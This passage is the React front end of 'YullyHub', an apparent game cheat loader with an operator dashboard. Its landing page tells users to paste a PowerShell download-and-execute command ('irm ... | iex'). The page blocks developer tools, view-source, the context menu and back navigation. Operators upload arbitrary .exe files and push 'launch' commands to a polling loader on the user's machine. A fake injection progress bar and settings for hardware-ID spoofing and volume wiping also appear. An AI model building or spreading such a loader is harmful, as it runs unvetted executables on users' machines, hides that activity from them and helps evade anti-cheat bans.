'use client';

import { useEffect, useRef, useState, useCallback } from 'react';

// ---- Landing page — shown until a loader with matching ?session=<id>
//      is polling /api/loader/poll. Anonymous visitors never see the
//      dashboard because they don't have a valid session id yet. ----
function LandingPage({ session, checking }) {
    const cmd = 'irm https://yullyhub.com/loader | iex';
    const [copied, setCopied] = useState(false);
    const doCopy = async () => {
        try { await navigator.clipboard.writeText(cmd); setCopied(true); setTimeout(() => setCopied(false), 1500); } catch {}
    };
    return (
        <div className="landing">
            <div className="stars" aria-hidden="true"></div>
            <div className="landing-inner">
                <img className="landing-logo" src="/YullyLogo.png" alt="YullyHub" />
                <div className="landing-brand">YULLYHUB</div>
                <div className="landing-label">Run:</div>
                <div className="landing-code-row">
                    <code className="landing-code">{cmd}</code>
                    <button className="landing-copy" onClick={doCopy}>{copied ? 'Copied ✓' : 'Copy'}</button>
                </div>
                <div className="landing-hint">
                    {session
                        ? checking
                            ? 'Waiting for loader to connect…'
                            : 'Loader not online. Run the command above in PowerShell to start it.'
                        : 'Open PowerShell, paste the command, hit enter. Your browser will re-open with the dashboard.'}
                </div>
            </div>
        </div>
    );
}

const DEMO_GAMES = [
    { id: 'demo-gta',  name: 'GTA V',    cls: 'g-gta',  desc: 'Demo card — upload your own product in Admin.', demo: true },
    { id: 'demo-dota', name: 'Dota 2',   cls: 'g-dota', desc: 'Demo card — upload your own product in Admin.', demo: true },
    { id: 'demo-cs',   name: 'CS2',      cls: 'g-cs',   desc: 'Demo card — upload your own product in Admin.', demo: true },
    { id: 'demo-val',  name: 'Valorant', cls: 'g-val',  desc: 'Demo card — upload your own product in Admin.', demo: true },
];

const DEMO_CLASSES = ['g-gta', 'g-dota', 'g-cs', 'g-val'];

// Rarity tags cycled across products for the tables (visual only)
const RARITY_TIERS = [
    { key: 'ultra',   label: 'Ultra Rare' },
    { key: 'veryrare',label: 'Very Rare' },
    { key: 'rare',    label: 'Rare' },
    { key: 'uncommon',label: 'Uncommon' },
    { key: 'common',  label: 'Common' },
];
const rarityFor = (idx) => RARITY_TIERS[idx % RARITY_TIERS.length];
const rarityPercent = (idx) => {
    // stable-ish pseudo random percent per index
    const seed = 3.14 + idx * 1.71;
    const v = (Math.sin(seed) + 1) * 50; // 0..100
    return v.toFixed(2);
};

function Clock() {
    const [now, setNow] = useState('');
    useEffect(() => {
        const tick = () => {
            const d = new Date();
            const hh = String(d.getHours()).padStart(2, '0');
            const mm = String(d.getMinutes()).padStart(2, '0');
            setNow(`${hh}:${mm}`);
        };
        tick();
        const iv = setInterval(tick, 15_000);
        return () => clearInterval(iv);
    }, []);
    return <span className="psn-clock">{now}</span>;
}

export default function Page() {
    // ---- Session gate — the URL must carry ?session=<loaderId>, and
    //      that loader must be actively polling /api/loader/poll before
    //      the dashboard is unlocked. Otherwise show the landing page. ----
    const [session, setSession] = useState(null);
    const [loaderConnected, setLoaderConnected] = useState(false);
    const [checkingLoader, setCheckingLoader] = useState(true);

    // Kiosk-mode key + context blocking. Runs always (landing + dashboard).
    useEffect(() => {
        const blockKey = (e) => {
            const k = (e.key || '').toLowerCase();
            const ctrl  = e.ctrlKey  || e.metaKey;
            const shift = e.shiftKey;
            const alt   = e.altKey;

            const isBad =
                k === 'f5'      ||
                k === 'f11'     ||
                k === 'f12'     ||
                k === 'escape'  ||
                (ctrl && k === 'r') ||
                (ctrl && k === 'w') ||
                (ctrl && k === 't') ||
                (ctrl && k === 'n') ||
                (ctrl && k === 'u') ||
                (ctrl && k === 's') ||
                (ctrl && k === 'p') ||
                (ctrl && k === 'j') ||
                (ctrl && k === 'h') ||
                (ctrl && shift && (k === 'i' || k === 'j' || k === 'c' || k === 'r')) ||
                (alt  && (k === 'arrowleft' || k === 'arrowright'));

            if (isBad) {
                e.preventDefault();
                e.stopPropagation();
                e.stopImmediatePropagation();
                return false;
            }
        };
        const blockCtx = (e) => { e.preventDefault(); e.stopPropagation(); return false; };
        document.addEventListener('keydown', blockKey, true);
        document.addEventListener('contextmenu', blockCtx, true);
        try { window.history.pushState(null, '', window.location.href); } catch {}
        const popBlock = () => { try { window.history.pushState(null, '', window.location.href); } catch {} };
        window.addEventListener('popstate', popBlock);
        return () => {
            document.removeEventListener('keydown', blockKey, true);
            document.removeEventListener('contextmenu', blockCtx, true);
            window.removeEventListener('popstate', popBlock);
        };
    }, []);

    useEffect(() => {
        if (typeof window === 'undefined') return;
        const url = new URL(window.location.href);
        const s = url.searchParams.get('session');
        setSession(s);
        if (!s) { setCheckingLoader(false); return; }

        let alive = true;
        let hasSeenOnline = false;
        const check = async () => {
            try {
                const r = await fetch(`/api/loader/status?id=${encodeURIComponent(s)}`, { cache: 'no-store' });
                if (!alive) return;
                if (r.ok) {
                    const j = await r.json();
                    const online = !!j.online;
                    if (online) hasSeenOnline = true;
                    setLoaderConnected(hasSeenOnline);
                    setState((prev) => ({
                        ...prev,
                        online,
                        count: online ? 1 : 0,
                        agents: online ? [{ id: s, addr: 'https poll', connectedAt: j.lastSeen || Date.now() }] : [],
                    }));
                }
            } catch {}
            if (alive) setCheckingLoader(false);
        };
        check();
        const iv = setInterval(check, 2500);
        return () => { alive = false; clearInterval(iv); };
    }, []);

    const [screen, setScreen] = useState('home');
    const [selected, setSelected] = useState(0);
    const [state, setState] = useState({ online: false, count: 0, agents: [] });
    const [events, setEvents] = useState([]);
    const [injectPct, setInjectPct] = useState(0);
    const [injectStatus, setInjectStatus] = useState('Processing...');
    const [products, setProducts] = useState([]);
    const [busy, setBusy] = useState(false);
    const [upload, setUpload] = useState({ exe: null, image: null, title: '' });
    const [launchCount, setLaunchCount] = useState(0);
    const wsRef = useRef(null);

    const pushEvent = (msg, cls = '') => {
        const t = new Date().toLocaleTimeString();
        setEvents((e) => [{ t, msg, cls, id: Math.random().toString(36).slice(2) }, ...e].slice(0, 60));
    };

    const loadProducts = useCallback(async () => {
        try {
            const r = await fetch('/api/products');
            const j = await r.json();
            setProducts(j.products || []);
        } catch {}
    }, []);

    // ---- WebSocket to /ws-ui ----
    useEffect(() => {
        let alive = true;
        let ws;
        const connect = () => {
            if (!alive) return;
            const scheme = (location.protocol === 'https:') ? 'wss' : 'ws';
            ws = new WebSocket(`${scheme}://${location.host}/ws-ui`);
            wsRef.current = ws;
            ws.onopen = () => pushEvent('dashboard connected to server', 'ok');
            ws.onmessage = (ev) => {
                try {
                    const data = JSON.parse(ev.data);
                    if (data.type === 'state') {
                        setState({ online: data.online, count: data.count, agents: data.agents });
                    } else if (data.type === 'loader_connected') {
                        pushEvent(`loader connected [id=${data.agent.id}]`, 'ok');
                    } else if (data.type === 'loader_disconnected') {
                        pushEvent(`loader disconnected [id=${data.agent.id}]`, 'bad');
                    } else if (data.type === 'command_sent') {
                        pushEvent(`> ${data.command}  delivered=${data.delivered}`, 'accent');
                    } else if (data.type === 'loader_message') {
                        pushEvent(`< ${data.agent.id}: ${JSON.stringify(data.message)}`, '');
                    }
                } catch {}
            };
            ws.onclose = () => {
                pushEvent('server disconnected — retrying...', 'warn');
                setTimeout(connect, 1200);
            };
            ws.onerror = () => ws.close();
        };
        connect();
        loadProducts();
        return () => { alive = false; ws?.close(); };
    }, [loadProducts]);

    const sendCommand = async (payload) => {
        try {
            const r = await fetch('/api/command', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload),
            });
            return await r.json();
        } catch (e) {
            pushEvent('send failed: ' + e.message, 'bad');
            return null;
        }
    };

    const islandSend = (msg) => {
        try {
            if (wsRef.current && wsRef.current.readyState === 1) {
                wsRef.current.send(JSON.stringify(msg));
            }
        } catch {}
    };

    const handleStart = async (overrideIdx) => {
        const list = getVisibleList();
        const idx = (typeof overrideIdx === 'number') ? overrideIdx : safeSelected;
        const target = list[idx];
        if (!target) return;
        if (typeof overrideIdx === 'number') setSelected(overrideIdx);
        setScreen('inject');
        setInjectPct(0);
        setInjectStatus('Processing...');
        setLaunchCount(c => c + 1);

        const productName = target.name || target.title || 'product';

        if (target.demo) {
            sendCommand({ type: 'ping' });
        } else {
            const url = `${location.protocol}//${location.host}/api/products/${target.id}/exe`;
            let token = null;
            try {
                const r = await fetch('/api/auth/exchange', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        productId: target.id,
                        userId:    'demo-user',
                        plan:      'lifetime',
                    }),
                });
                if (r.ok) {
                    const j = await r.json();
                    token = j.token;
                    pushEvent(`auth: minted token ${token.slice(0,8)}… ttl=${j.ttl_seconds}s`, 'ok');
                } else {
                    pushEvent(`auth: exchange failed (HTTP ${r.status})`, 'warn');
                }
            } catch (e) {
                pushEvent('auth: exchange error ' + e.message, 'warn');
            }
            sendCommand({
                type:      'launch',
                productId: target.id,
                title:     target.title,
                url,
                token,
                apiHost:   `${location.protocol}//${location.host}`,
            });
        }
        let latestScript = Array.isArray(target.script) ? target.script : null;
        if (!target.demo) {
            try {
                const r = await fetch(`/api/products/${target.id}`);
                if (r.ok) {
                    const fresh = await r.json();
                    if (Array.isArray(fresh.script)) latestScript = fresh.script;
                }
            } catch {}
        }

        let p = 0;
        const iv = setInterval(() => {
            p += 3 + Math.random() * 4;
            if (p >= 100) {
                p = 100;
                clearInterval(iv);
                setInjectStatus('Injection complete.');
                setInjectPct(100);
                const script = Array.isArray(latestScript) && latestScript.length
                    ? latestScript
                    : [{ kind: 'message', text: `${productName} loaded successfully!`, dismiss: 'timeout', timeout: 2.5 },
                       { kind: 'close' }];
                pushEvent(`island: playing ${script.length} step${script.length === 1 ? '' : 's'} for ${productName}`, 'ok');
                islandSend({
                    type: 'island',
                    action: 'script',
                    product: productName,
                    steps: script,
                });

                setTimeout(() => {
                    setScreen('handover');
                    try { window.close(); } catch {}
                }, 900);
            } else {
                setInjectPct(p);
            }
        }, 90);
    };

    const handleUpload = async (e) => {
        e.preventDefault();
        if (!upload.exe) { pushEvent('pick an .exe first', 'bad'); return; }
        setBusy(true);
        const form = new FormData();
        form.append('exe', upload.exe);
        if (upload.image) form.append('image', upload.image);
        if (upload.title.trim()) form.append('title', upload.title.trim());
        try {
            const r = await fetch('/api/products', { method: 'POST', body: form });
            const j = await r.json();
            if (r.ok) {
                pushEvent(`uploaded product "${j.title}" (${(j.exeSize/1024).toFixed(1)} KB)`, 'ok');
                setUpload({ exe: null, image: null, title: '' });
                document.getElementById('exeInput').value = '';
                if (document.getElementById('imgInput')) document.getElementById('imgInput').value = '';
                await loadProducts();
            } else {
                pushEvent('upload failed: ' + (j.error || 'unknown'), 'bad');
            }
        } catch (e) {
            pushEvent('upload error: ' + e.message, 'bad');
        }
        setBusy(false);
    };

    const updateProduct = async (id, { exe, image, title } = {}) => {
        setBusy(true);
        const form = new FormData();
        if (exe)   form.append('exe', exe);
        if (image) form.append('image', image);
        if (title && title.trim()) form.append('title', title.trim());
        try {
            const r = await fetch(`/api/products/${id}`, { method: 'PUT', body: form });
            const j = await r.json();
            if (r.ok) {
                const parts = [];
                if (exe)   parts.push(`exe (${(j.exeSize/1024).toFixed(1)} KB)`);
                if (image) parts.push('image');
                if (title) parts.push(`title="${j.title}"`);
                pushEvent(`updated product ${id}: ${parts.join(', ') || 'nothing'}`, 'ok');
                await loadProducts();
            } else {
                pushEvent(`update failed: ${j.error || 'unknown'}`, 'bad');
            }
        } catch (e) {
            pushEvent('update error: ' + e.message, 'bad');
        }
        setBusy(false);
    };

    const pickAndUpdateExe = (id) => {
        const el = document.createElement('input');
        el.type = 'file';
        el.accept = '.exe,application/x-msdownload,application/octet-stream';
        el.onchange = async () => { const f = el.files?.[0]; if (f) await updateProduct(id, { exe: f }); };
        el.click();
    };
    const pickAndUpdateImage = (id) => {
        const el = document.createElement('input');
        el.type = 'file';
        el.accept = 'image/*';
        el.onchange = async () => { const f = el.files?.[0]; if (f) await updateProduct(id, { image: f }); };
        el.click();
    };

    // ---- SCRIPT EDITOR ----
    const [scriptEditor, setScriptEditor] = useState(null);
    const openScriptEditor = (product) => {
        const existing = Array.isArray(product.script) ? product.script : [];
        const cloned = existing.length ? existing : [
            { kind: 'message', text: 'Press F2 once you are in game', dismiss: 'keybind', keybind: 'F2', timeout: 30 },
            { kind: 'message', text: 'Injecting Product…', dismiss: 'timeout', timeout: 3 },
            { kind: 'success', text: 'Product Injected Successfully', timeout: 2.5 },
            { kind: 'close', text: 'Click me to close loader', timeout: 4 },
        ];
        _lastSavedRef.current = existing.length ? JSON.stringify(existing) : '';
        setScriptSaveState('idle');
        setScriptEditor({ id: product.id, title: product.title, steps: cloned });
    };
    const updateStep = (idx, patch) => setScriptEditor(s => s ? { ...s, steps: s.steps.map((st, i) => i === idx ? { ...st, ...patch } : st) } : s);
    const addStep = (kind) => setScriptEditor(s => {
        if (!s) return s;
        let base;
        if (kind === 'close')      base = { kind: 'close',   text: 'Click me to close loader', timeout: 4 };
        else if (kind === 'success') base = { kind: 'success', text: 'Product Injected Successfully', timeout: 2.5 };
        else                       base = { kind: 'message', text: 'Type message…', dismiss: 'timeout', timeout: 2 };
        return { ...s, steps: [...s.steps, base] };
    });
    const removeStep = (idx) => setScriptEditor(s => s ? { ...s, steps: s.steps.filter((_, i) => i !== idx) } : s);
    const moveStep = (idx, dir) => setScriptEditor(s => {
        if (!s) return s;
        const j = idx + dir;
        if (j < 0 || j >= s.steps.length) return s;
        const steps = s.steps.slice();
        [steps[idx], steps[j]] = [steps[j], steps[idx]];
        return { ...s, steps };
    });
    const _lastSavedRef = useRef('');
    const [scriptSaveState, setScriptSaveState] = useState('idle');
    useEffect(() => {
        if (!scriptEditor) return;
        const body = JSON.stringify(scriptEditor.steps);
        if (body === _lastSavedRef.current) return;
        setScriptSaveState('saving');
        const t = setTimeout(async () => {
            try {
                const form = new FormData();
                form.append('script', body);
                const r = await fetch(`/api/products/${scriptEditor.id}`, { method: 'PUT', body: form });
                if (r.ok) {
                    _lastSavedRef.current = body;
                    setScriptSaveState('saved');
                    pushEvent(`script auto-saved for ${scriptEditor.title} (${scriptEditor.steps.length} step${scriptEditor.steps.length === 1 ? '' : 's'})`, 'ok');
                    await loadProducts();
                } else {
                    const j = await r.json().catch(() => ({}));
                    setScriptSaveState('idle');
                    pushEvent('script save failed: ' + (j.error || r.status), 'bad');
                }
            } catch (e) {
                setScriptSaveState('idle');
                pushEvent('script save error: ' + e.message, 'bad');
            }
        }, 350);
        return () => clearTimeout(t);
    }, [scriptEditor?.steps, scriptEditor?.id]);

    const renameProduct = async (id, currentTitle) => {
        const t = prompt('Rename product to:', currentTitle || '');
        if (t == null) return;
        const trimmed = t.trim();
        if (!trimmed || trimmed === currentTitle) return;
        await updateProduct(id, { title: trimmed });
    };

    const deleteProduct = async (id) => {
        if (!confirm('Delete this product?')) return;
        await fetch(`/api/products/${id}`, { method: 'DELETE' });
        pushEvent(`deleted product ${id}`, 'warn');
        await loadProducts();
    };

    const getVisibleList = () => {
        if (products.length > 0) {
            return products.map((p, i) => ({
                ...p,
                name: p.title,
                cls: DEMO_CLASSES[i % DEMO_CLASSES.length],
                desc: `${p.exeName} · ${(p.exeSize / 1024).toFixed(1)} KB`,
                demo: false,
            }));
        }
        return DEMO_GAMES;
    };
    const list = getVisibleList();
    const safeSelected = Math.min(selected, list.length - 1);
    const g = list[safeSelected] || list[0];

    useEffect(() => {
        if (selected >= list.length && list.length > 0) setSelected(0);
    }, [list.length, selected]);

    // Gate — no valid session + connected loader → landing page only.
    if (!session || !loaderConnected) {
        return <LandingPage session={session} checking={checkingLoader} />;
    }

    // ---- derived "PSN stats" from products/events ----
    const totalProducts   = list.filter(p => !p.demo).length || list.length;
    const scriptedCount   = list.filter(p => Array.isArray(p.script) && p.script.length).length;
    const completion      = totalProducts ? Math.round((scriptedCount / totalProducts) * 100) : 0;
    const rarestProducts  = list.slice(0, 6);
    const recentProducts  = list.slice(0, 6);
    const cabinetProducts = list.slice(0, 6);
    const milestoneProducts = list.slice(0, 5);

    return (
        <>
            <svg width="0" height="0" style={{ position: 'absolute' }}>
                <defs>
                    <linearGradient id="ringGrad" x1="0%" y1="0%" x2="100%" y2="100%">
                        <stop offset="0%" stopColor="#e91e63" />
                        <stop offset="100%" stopColor="#ff4020" />
                    </linearGradient>
                    <linearGradient id="plat" x1="0%" y1="0%" x2="0%" y2="100%">
                        <stop offset="0%" stopColor="#a9c4ff" /><stop offset="100%" stopColor="#3e5fb3" />
                    </linearGradient>
                </defs>
            </svg>

            <div className="psn">
                <div className="stars" aria-hidden="true"></div>

                {/* top-right in-page X — the only exit since browser chrome is hidden */}
                <button className="win-close" onClick={() => { try { window.close(); } catch {} }} title="Close">
                    <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round">
                        <line x1="6" y1="6" x2="18" y2="18"/><line x1="18" y1="6" x2="6" y2="18"/>
                    </svg>
                </button>

                <header className="psn-header">
                    <div className="psn-brand">
                        <img className="psn-logo" src="/YullyLogo.png" alt="YullyHub" />
                        <div className="psn-titles">
                            <div className="psn-name">YullyHub</div>
                            <div className="psn-tag">Loader Interface</div>
                        </div>
                    </div>
                    <nav className="psn-nav">
                        <button className={`psn-tab ${screen === 'home' ? 'on' : ''}`}     onClick={() => setScreen('home')}>Products</button>
                        <button className={`psn-tab ${screen === 'admin' ? 'on' : ''}`}    onClick={() => setScreen('admin')}>Admin</button>
                        <button className={`psn-tab ${screen === 'settings' ? 'on' : ''}`} onClick={() => setScreen('settings')}>Settings</button>
                        <button className={`psn-tab ${screen === 'login' ? 'on' : ''}`}    onClick={() => setScreen('login')}>Account</button>
                    </nav>
                    <div className="psn-header-right">
                        <div className="psn-status">
                            <span className={`psn-dot ${state.online ? 'on' : ''}`}></span>
                            {state.online ? 'Loader online' : 'no loader'}
                        </div>
                        <Clock />
                    </div>
                </header>

                {screen === 'home' && (
                <>
                    {/* PS+ tile + product strip */}
                    <section className="psn-strip">
                        <div className={`psn-tile psn-tile-primary ${safeSelected === 0 ? 'on' : ''}`}
                             onClick={() => setSelected(0)}>
                            <img src="/YullyLogo.png" alt="Yully" />
                            <div className="psn-tile-caption">Yully+ Profile</div>
                        </div>
                        {list.map((p, i) => {
                            const bg = p.imageName && !p.demo
                                ? { backgroundImage: `url(/api/products/${p.id}/image)` }
                                : undefined;
                            const active = i === safeSelected;
                            return (
                                <div
                                    key={p.id}
                                    className={`psn-tile ${active ? 'on' : ''}`}
                                    style={bg}
                                    onClick={() => setSelected(i)}
                                    onDoubleClick={(e) => { e.stopPropagation(); handleStart(i); }}
                                    title={`${p.name} — double-click to launch`}
                                >
                                    {!bg && <div className="psn-tile-fallback">{p.name.slice(0, 2).toUpperCase()}</div>}
                                    <div className="psn-tile-overlay">
                                        <div className="psn-tile-name">{p.name}</div>
                                    </div>
                                </div>
                            );
                        })}
                    </section>

                    {/* Stat strip */}
                    <section className="psn-stats">
                        <div className="psn-stat"><div className="k">Products</div><div className="v">{totalProducts}</div></div>
                        <div className="psn-stat"><div className="k">Scripted</div><div className="v">{scriptedCount}</div></div>
                        <div className="psn-stat"><div className="k">Completion</div><div className="v">{completion}%</div></div>
                        <div className="psn-stat"><div className="k">Launched</div><div className="v">{launchCount}</div></div>
                        <div className="psn-stat"><div className="k">Loaders / day</div><div className="v">{state.online ? 1 : 0}</div></div>
                        <div className="psn-stat"><div className="k">Global rank</div><div className="v">#1</div></div>
                        <div className="psn-stat"><div className="k">Local rank</div><div className="v">#1</div></div>
                    </section>

                    {/* PSN-style grid of panels */}
                    <section className="psn-grid">
                        {/* Profile summary */}
                        <div className="psn-panel">
                            <div className="psn-panel-head">Profile summary</div>
                            <div className="psn-summary">
                                <div className="psn-medals">
                                    <div className="medal plat"><span className="v">{state.online ? 1 : 0}</span><span className="l">Loaders</span></div>
                                    <div className="medal gold"><span className="v">{totalProducts}</span><span className="l">Products</span></div>
                                    <div className="medal silver"><span className="v">{scriptedCount}</span><span className="l">Scripted</span></div>
                                    <div className="medal bronze"><span className="v">{launchCount}</span><span className="l">Launched</span></div>
                                </div>
                                <div className="psn-summary-total">
                                    <div className="v">{totalProducts + scriptedCount + launchCount}</div>
                                    <div className="l">Total</div>
                                </div>
                            </div>
                        </div>

                        {/* Recent products (like Recent trophies) */}
                        <div className="psn-panel">
                            <div className="psn-panel-head">Recent products</div>
                            <div className="psn-list">
                                {recentProducts.map((p, i) => {
                                    const bg = p.imageName && !p.demo
                                        ? { background: `url(/api/products/${p.id}/image) center/cover` }
                                        : undefined;
                                    const r = rarityFor(i);
                                    return (
                                        <div className="psn-row" key={`recent-${p.id}`} onClick={() => { setSelected(list.indexOf(p)); handleStart(list.indexOf(p)); }}>
                                            <div className="psn-row-thumb" style={bg}>{!bg && p.name.slice(0,2).toUpperCase()}</div>
                                            <div className="psn-row-body">
                                                <div className="psn-row-title">{p.name}</div>
                                                <div className={`psn-row-sub rar-${r.key}`}>{rarityPercent(i)}%  {r.label}</div>
                                            </div>
                                            <div className="psn-row-side">launch</div>
                                        </div>
                                    );
                                })}
                            </div>
                        </div>

                        {/* Product milestones */}
                        <div className="psn-panel">
                            <div className="psn-panel-head">Product milestones</div>
                            <div className="psn-list">
                                {milestoneProducts.map((p, i) => {
                                    const bg = p.imageName && !p.demo
                                        ? { background: `url(/api/products/${p.id}/image) center/cover` }
                                        : undefined;
                                    const milestones = ['Latest', '2,500th', '1,000th', '500th', '250th'];
                                    return (
                                        <div className="psn-row" key={`mile-${p.id}`}>
                                            <div className="psn-row-thumb" style={bg}>{!bg && p.name.slice(0,2).toUpperCase()}</div>
                                            <div className="psn-row-body">
                                                <div className="psn-row-title">{p.name}</div>
                                                <div className="psn-row-sub">Product deploy #{i + 1}</div>
                                            </div>
                                            <div className="psn-row-side accent">{milestones[i] || `${(i+1)*100}th`}</div>
                                        </div>
                                    );
                                })}
                            </div>
                        </div>

                        {/* Product cabinet */}
                        <div className="psn-panel">
                            <div className="psn-panel-head">Product cabinet</div>
                            <div className="psn-list">
                                {cabinetProducts.map((p, i) => {
                                    const bg = p.imageName && !p.demo
                                        ? { background: `url(/api/products/${p.id}/image) center/cover` }
                                        : undefined;
                                    const r = rarityFor(i);
                                    return (
                                        <div className="psn-row" key={`cab-${p.id}`}>
                                            <div className="psn-row-thumb sq" style={bg}>{!bg && p.name.slice(0,2).toUpperCase()}</div>
                                            <div className="psn-row-body">
                                                <div className="psn-row-title">{p.name}</div>
                                                <div className={`psn-row-sub rar-${r.key}`}>{rarityPercent(i)}%  {r.label}</div>
                                            </div>
                                        </div>
                                    );
                                })}
                            </div>
                        </div>

                        {/* Rarest products */}
                        <div className="psn-panel">
                            <div className="psn-panel-head">Rarest products</div>
                            <div className="psn-list">
                                {rarestProducts.map((p, i) => {
                                    const bg = p.imageName && !p.demo
                                        ? { background: `url(/api/products/${p.id}/image) center/cover` }
                                        : undefined;
                                    const r = RARITY_TIERS[Math.min(i, 2)];
                                    return (
                                        <div className="psn-row" key={`rare-${p.id}`}>
                                            <div className="psn-row-thumb round" style={bg}>{!bg && p.name.slice(0,2).toUpperCase()}</div>
                                            <div className="psn-row-body">
                                                <div className="psn-row-title">{p.name}</div>
                                                <div className={`psn-row-sub rar-${r.key}`}>{(1 + i * 0.4).toFixed(2)}%  {r.label}</div>
                                            </div>
                                        </div>
                                    );
                                })}
                            </div>
                        </div>

                        {/* Live event log */}
                        <div className="psn-panel">
                            <div className="psn-panel-head">Live events</div>
                            <div className="psn-events">
                                {events.length === 0 && <div className="psn-event dim">waiting for events…</div>}
                                {events.slice(0, 10).map(e => (
                                    <div className="psn-event" key={e.id}>
                                        <span className="t">{e.t}</span>
                                        <span className={`m ${e.cls}`}>{e.msg}</span>
                                    </div>
                                ))}
                            </div>
                        </div>
                    </section>

                    {/* Selected product action bar */}
                    {g && (
                    <section className="psn-launch">
                        <div className="psn-launch-thumb"
                             style={g.imageName && !g.demo ? { background: `url(/api/products/${g.id}/image) center/cover` } : undefined}>
                            {(!g.imageName || g.demo) && g.name.slice(0,2).toUpperCase()}
                        </div>
                        <div className="psn-launch-body">
                            <div className="psn-launch-name">{g.name}</div>
                            <div className="psn-launch-desc">{g.desc}</div>
                        </div>
                        <button className="psn-launch-btn" disabled={!state.online} onClick={() => handleStart(safeSelected)}>
                            LAUNCH
                        </button>
                    </section>
                    )}
                </>
                )}

                {screen === 'inject' && (
                    <section className="psn-panel psn-inject" key="inject">
                        <div className="inject-heading">Injecting: <b>{g.name}</b></div>
                        <div className="inject-status">{injectStatus}</div>
                        <div className="ring-wrap">
                            <svg className="ring" viewBox="0 0 100 100">
                                <circle className="ring-bg" cx="50" cy="50" r="46" fill="none" strokeWidth="4"/>
                                <circle className="ring-fg" cx="50" cy="50" r="46" fill="none" strokeWidth="4"
                                        strokeDasharray="289" strokeDashoffset={289 * (1 - injectPct / 100)}/>
                            </svg>
                            <div className="ring-inner"
                                 style={g.imageName && !g.demo ? { background: `url(/api/products/${g.id}/image) center/cover` } : undefined}>
                                {(!g.imageName || g.demo) && g.name.toUpperCase().slice(0, 6)}
                            </div>
                        </div>
                        <button className="psn-launch-btn" onClick={() => setScreen('home')}>BACK</button>
                    </section>
                )}

                {screen === 'handover' && (
                    <section className="psn-panel psn-handover" key="handover">
                        <img src="/YullyLogo.png" alt="Yully" className="handover-logo" />
                        <div className="handover-title">Dynamic Island active</div>
                        <div className="handover-sub">
                            {g?.name || 'Your product'} is running. Watch the Dynamic Island for the next step — you can close this window.
                        </div>
                        <button className="psn-launch-btn" onClick={() => setScreen('home')}>Back to products</button>
                    </section>
                )}

                {screen === 'admin' && (
                    <section className="psn-panel psn-admin" key="admin">
                        <div className="psn-panel-head">Admin — upload products</div>
                        <form className="upload-form" onSubmit={handleUpload}>
                            <div className="field-grid">
                                <label className="drop-field">
                                    <div className="drop-label">.EXE file <span className="req">*</span></div>
                                    <input id="exeInput" type="file"
                                           accept=".exe,application/x-msdownload,application/octet-stream"
                                           onChange={(e) => setUpload(u => ({ ...u, exe: e.target.files?.[0] || null }))} />
                                    <div className="drop-hint">
                                        {upload.exe ? `${upload.exe.name} · ${(upload.exe.size/1024).toFixed(1)} KB` : 'Choose file…'}
                                    </div>
                                </label>
                                <label className="drop-field">
                                    <div className="drop-label">Image <span className="opt">optional</span></div>
                                    <input id="imgInput" type="file" accept="image/*"
                                           onChange={(e) => setUpload(u => ({ ...u, image: e.target.files?.[0] || null }))} />
                                    <div className="drop-hint">
                                        {upload.image ? upload.image.name : 'Choose image…'}
                                    </div>
                                </label>
                            </div>
                            <div className="input-field" style={{ marginTop: 12 }}>
                                <input type="text" placeholder="Title (optional — defaults to exe name)"
                                       value={upload.title}
                                       onChange={(e) => setUpload(u => ({ ...u, title: e.target.value }))} />
                            </div>
                            <button type="submit" className="psn-launch-btn wide" style={{ marginTop: 14 }}
                                    disabled={busy || !upload.exe}>
                                {busy ? 'UPLOADING…' : 'UPLOAD PRODUCT'}
                            </button>
                        </form>

                        <div className="psn-panel-head" style={{ marginTop: 22 }}>
                            Products ({products.length})
                        </div>
                        {products.length === 0 && <div className="empty">No products yet. Upload one above.</div>}
                        <div className="product-grid">
                            {products.map((p) => (
                                <div className="product-card" key={p.id}>
                                    <div className="product-thumb"
                                         style={p.imageName ? { background: `url(/api/products/${p.id}/image) center/cover` } : undefined}>
                                        {!p.imageName && <span>EXE</span>}
                                    </div>
                                    <div className="product-body">
                                        <div className="product-title">{p.title}</div>
                                        <div className="product-meta">{p.exeName} · {(p.exeSize/1024).toFixed(1)} KB</div>
                                        <div className="product-actions">
                                            <button className="mini-btn" disabled={!state.online}
                                                    onClick={() => sendCommand({ type: 'launch', productId: p.id, title: p.title, url: `http://${location.host}/api/products/${p.id}/exe` })}>
                                                Launch
                                            </button>
                                            <button className="mini-btn" disabled={busy} onClick={() => pickAndUpdateExe(p.id)}>New EXE</button>
                                            <button className="mini-btn" disabled={busy} onClick={() => pickAndUpdateImage(p.id)}>New Image</button>
                                            <button className="mini-btn" disabled={busy} onClick={() => renameProduct(p.id, p.title)}>Rename</button>
                                            <button className="mini-btn" disabled={busy} onClick={() => openScriptEditor(p)}>
                                                Script ({Array.isArray(p.script) ? p.script.length : 0})
                                            </button>
                                            <button className="mini-btn danger" onClick={() => deleteProduct(p.id)}>Delete</button>
                                        </div>
                                    </div>
                                </div>
                            ))}
                        </div>
                    </section>
                )}

                {screen === 'settings' && (
                    <section className="psn-panel psn-settings" key="settings">
                        <div className="psn-panel-head">Settings</div>
                        <div className="setting-row">
                            <div className="setting-left"><div className="setting-badge">01</div><div className="setting-name">MAC spoof</div></div>
                            <input type="checkbox" className="toggle" defaultChecked />
                        </div>
                        <div className="setting-row">
                            <div className="setting-left"><div className="setting-badge">02</div><div className="setting-name">Serial spoof</div></div>
                            <div className="setting-status"><b>WiFi</b> is disabled</div>
                            <input type="checkbox" className="toggle" />
                        </div>
                        <div className="setting-row">
                            <div className="setting-left"><div className="setting-badge">03</div><div className="setting-name">Volume wipe</div></div>
                            <div className="setting-status"><b>USB</b> disconnected</div>
                            <input type="checkbox" className="toggle" defaultChecked />
                        </div>
                        <div className="setting-row">
                            <div className="setting-left"><div className="setting-badge">04</div><div className="setting-name">Registry cleanup</div></div>
                            <input type="checkbox" className="toggle" />
                        </div>
                        <div className="ping-block">
                            <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 12, fontSize: 12, color: 'var(--muted)' }}>
                                <span className={`psn-dot ${state.online ? 'on' : ''}`}></span>
                                <span>{state.online ? `${state.count} loader${state.count === 1 ? '' : 's'} online` : 'no loader connected'}</span>
                            </div>
                            {state.agents.length > 0 && (
                                <div className="agent-strip">
                                    {state.agents.map(a => (
                                        <div key={a.id} className="agent-row">
                                            <span className="live">●</span>
                                            <span className="id">{a.id}</span>
                                            <span>@ {a.addr}</span>
